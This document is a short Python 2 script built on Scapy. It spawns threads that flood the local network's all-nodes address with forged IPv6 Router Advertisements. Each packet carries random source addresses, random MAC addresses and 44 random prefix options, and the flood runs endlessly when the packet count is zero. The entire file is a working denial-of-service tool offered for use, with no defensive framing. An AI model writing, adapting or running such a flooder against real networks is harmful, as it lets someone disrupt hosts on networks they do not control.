#! /usr/bin/python2

from scapy.all import *
import random
import sys
import threading
import sys

try:
    print sys.argv[3]
except:
    print 'usage:',sys.argv[0],' interface threads packets'
    sys.exit(0)
class RA_Flooder (threading.Thread):
    def __init__(self, counter=0):
		threading.Thread.__init__(self)
		self.iface = sys.argv[1]
		self.counter = counter

    def prefix_pack(self):
		self.pkt = ICMPv6NDOptPrefixInfo()
		self.pkt.prefixlen = 64
			#self.pkt.prefix = "cc5f::"
		self.pkt.prefix = self.prefix_rand()
		#self.pkt.show()
		return self.pkt

    def ipv6_rand(self):
		self.rand = ':'.join('{:x}'.format(random.randint(0,2**16 - 1)) for i in range(4))
		return 'fe80::' + self.rand

    def prefix_rand(self):
		self.pre_rand = ':'.join('{:x}'.format(random.randint(0,2**16 - 1)) for i in range(2))
		return '2012:' + self.pre_rand + ':b304::' 

    def mac_rand(self):
		self.mac = ':'.join('{:x}'.format(random.randint(0,2**8 - 1)) for i in range(6))
		return str(self.mac)

    def packet_gen(self):

        self.a = IPv6()
        self.a.dst = "ff02::1"
        self.a.src = self.ipv6_rand()
        self.a.nh = 58

        self.b = ICMPv6ND_RA()
        self.b.routerlifetime = 0

        self.c = ICMPv6NDOptSrcLLAddr()
        self.c.lladdr = self.mac_rand()

        self.d = ICMPv6NDOptMTU()
    	self.e = ICMPv6NDOptPrefixInfo()
    	self.e.prefixlen = 64
        #self.e.prefix = self.prefix_rand()

        self.pk = self.a/self.b/self.c/self.d
        for i in range(44):
            self.pk = self.pk/self.prefix_pack()
        return self.pk

    def run(self):
        self.s = conf.L3socket()#iface=self.iface)
        if self.counter is 0:
            while True:
                self.pkt = self.packet_gen()
                self.s.send(self.pkt)
        else:
            for x in range(self.counter):
                self.pkt = self.packet_gen()
                self.s.send(self.pkt)
        print '[*] Finished sending'

threadLock = threading.Lock()
threads = []

for x in range(0, int(sys.argv[2])):
    t = RA_Flooder(int(sys.argv[3]))
    threads.append(t)
    print '[+] Thread started ' + str(x)
    t.start()

print 'All threads started'
